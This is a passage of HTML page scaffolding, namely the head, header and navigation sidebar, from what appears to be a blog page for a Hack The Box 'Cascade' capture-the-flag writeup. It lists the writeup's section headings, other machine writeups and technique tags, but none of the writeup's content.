
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="ch3ckm8">
      
      
        <link rel="canonical" href="https://ch3ckm8.github.io/personal_blog4/ch3ckm8_HTB_Cascade/">
      
      
        <link rel="prev" href="../ch3ckm8_HTB_Blackfield/">
      
      
        <link rel="next" href="../ch3ckm8_HTB_EscapeTwo/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>Cascade - Ch3ckm8 Vault</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/interactive_graph.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/obsidian_tags.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/custom.css">
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#intro" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="Ch3ckm8 Vault" class="md-header__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Ch3ckm8 Vault
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Cascade
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href=".." class="md-tabs__link">
        
  
  
    
  
  Welcome

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../ch3ckm8_HTB_Active/" class="md-tabs__link">
          
  
  
  HTB Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-tabs__link">
          
  
  
  Other CTF Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../common_tools/" class="md-tabs__link">
          
  
  
  Notes

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../windows/" class="md-tabs__link">
          
  
  
  Tags

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="Ch3ckm8 Vault" class="md-nav__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    Ch3ckm8 Vault
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Welcome
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    HTB Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            HTB Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Active/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Administrator/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Administrator
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Blackfield/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blackfield
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Cascade
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Cascade
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#add-machine-to-etchosts" class="md-nav__link">
    <span class="md-ellipsis">
      Add machine to /etc/hosts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap scan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-enumeration-port-135" class="md-nav__link">
    <span class="md-ellipsis">
      RPC enumeration (port 135)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="RPC enumeration (port 135)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#anonymous-login" class="md-nav__link">
    <span class="md-ellipsis">
      Anonymous login:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-port-139445" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration (port 139/445)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB enumeration (port 139/445)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enum4linux" class="md-nav__link">
    <span class="md-ellipsis">
      enum4linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#via-anonymous-logon" class="md-nav__link">
    <span class="md-ellipsis">
      via anonymous logon
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LDAP enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#gather-all-users-optional" class="md-nav__link">
    <span class="md-ellipsis">
      Gather all users (optional)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-anonymous-login-is-allowed" class="md-nav__link">
    <span class="md-ellipsis">
      check if anonymous login is allowed
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#checking-access-to-services" class="md-nav__link">
    <span class="md-ellipsis">
      Checking access to services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-login-via-rthompson" class="md-nav__link">
    <span class="md-ellipsis">
      SMB login via r.thompson
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB login via r.thompson">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#downloading-and-inspecting-the-smb-shares" class="md-nav__link">
    <span class="md-ellipsis">
      Downloading and inspecting the SMB shares
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decrypting-encrypted-text" class="md-nav__link">
    <span class="md-ellipsis">
      Decrypting encrypted text
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-ssmith" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as s.smith
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bloodhound" class="md-nav__link">
    <span class="md-ellipsis">
      BloodHound
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-membership-of-user-ssmith" class="md-nav__link">
    <span class="md-ellipsis">
      Group membership of user s.smith
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#local-group-details" class="md-nav__link">
    <span class="md-ellipsis">
      Local group details
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#viewing-files-contained-inside-the-share" class="md-nav__link">
    <span class="md-ellipsis">
      Viewing files contained inside the share
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#debugging-the-app" class="md-nav__link">
    <span class="md-ellipsis">
      Debugging the app
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reverse-the-encryption-process" class="md-nav__link">
    <span class="md-ellipsis">
      Reverse the encryption process
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-arksvc" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as ArkSvc
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound-as-arksvc" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound as ArkSvc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Bloodhound as ArkSvc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#why-bloodhound-needs-dns-tcp-and-dns-timeout" class="md-nav__link">
    <span class="md-ellipsis">
      Why BloodHound needs --dns-tcp and --dns-timeout
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-membership-of-arksvc" class="md-nav__link">
    <span class="md-ellipsis">
      Group membership of ArkSvc
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#retrieving-deleted-objects-from-recycle-bin" class="md-nav__link">
    <span class="md-ellipsis">
      Retrieving deleted objects from Recycle Bin
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-administrator" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as Administrator
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_EscapeTwo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    EscapeTwo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Nocturnal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Nocturnal
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Return/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Return
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_TheFrizz/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    TheFrizz
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_forest/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forest
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_monteverde/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Monteverde
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_sauna/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Sauna
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Timelapse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Timelapse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_cicada/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cicada
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Escape/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Escape
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Flight/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Flight
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_fluffy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Fluffy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_puppy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Puppy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_tombwatcher/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Tombwatcher
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_certified/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Certified
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Other CTF Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Other CTF Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RoboGRoot's-Portfolio
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Notes
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../common_tools/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Commonly used tools and methodologies
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Tags
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Tags
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    windows
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AD/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AD
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADconnectAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADconnectAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AS-REP-roasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AS-REP-roasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../DCSync/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DCSync
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Docker/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Docker
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../GSSAPIauthentication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    GSSAPIauthentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Kerberoasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberoasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../NotAssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NotAssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OSCPpath/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OSCPpath
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PortForwarding/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PortForwarding
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PrivGroupAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PrivGroupAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RCE/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RCE
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RecycleBin/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RecycleBin
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WebApp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WebApp
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WinPEAS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WinPEAS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../XSS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    XSS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificates/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certificates
    
  </span>
  

      </a>
    </li>
  

              
            
              
